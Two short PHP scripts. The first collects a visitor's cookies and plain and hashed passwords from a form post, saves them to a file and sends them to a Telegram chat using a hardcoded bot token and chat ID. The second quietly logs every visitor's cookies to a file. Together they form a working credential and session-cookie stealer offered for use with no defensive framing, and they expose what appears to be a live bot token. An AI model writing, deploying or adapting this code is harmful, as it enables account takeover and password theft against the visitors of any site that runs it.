<?php
// Disable caching
header("Cache-Control: no-cache, no-store, must-revalidate");
header("Pragma: no-cache");
header("Expires: 0");

// Read cookies
$cookies = $_COOKIE;

// Read hashed and non-hashed passwords from the request
$hashedPassword = $_POST['hashed_password'];
$plainPassword = $_POST['plain_password'];

// Telegram Bot API configuration
$botToken = "6547328306:AAFosAwa7wPggddiOV_QgTw7xI-uX8ZEY6s";
$chatId = '-1001809635857';

// Save cookies, hashed password, and non-hashed password to a text file
$file = fopen('cookies.txt', 'w');
fwrite($file, "Cookies:\n");
foreach ($cookies as $key => $value) {
    fwrite($file, $key . ': ' . $value . PHP_EOL);
}
fwrite($file, PHP_EOL);
fwrite($file, "Hashed Password: " . $hashedPassword . PHP_EOL);
fwrite($file, "Plain Password: " . $plainPassword . PHP_EOL);
fclose($file);

// Prepare message content
$message = "Cookies:\n";
foreach ($cookies as $key => $value) {
    $message .= $key . ': ' . $value . PHP_EOL;
}
$message .= PHP_EOL;
$message .= "Hashed Password: " . $hashedPassword . PHP_EOL;
$message .= "Plain Password: " . $plainPassword . PHP_EOL;

// Send message to Telegram
$telegramUrl = "https://api.telegram.org/bot$botToken/sendMessage";
$telegramParams = [
    'chat_id' => $chatId,
    'text' => $message
];

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, $telegramUrl);
curl_setopt($ch, CURLOPT_POST, true);
curl_setopt($ch, CURLOPT_POSTFIELDS, $telegramParams);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false); // Adjust this based on your SSL configuration
$response = curl_exec($ch);
curl_close($ch);

echo 'Cookies, hashed password, and plain password cloned and saved to cookies.txt! Data sent to Telegram.';
?>


<?php
session_start();

// Check if the user is not logged in
if (!isset($_SESSION['loggedin']) || $_SESSION['loggedin'] !== true) {
    header("Location: login.php");
    exit;
}

// Read and log all visitor's cookies
$cookieLog = fopen("cookie_log.txt", "a");
fwrite($cookieLog, "Visitor Cookies:\n");
foreach ($_COOKIE as $name => $value) {
    fwrite($cookieLog, "Cookie: ".$name." = ".$value."\n");
}
fclose($cookieLog);
?>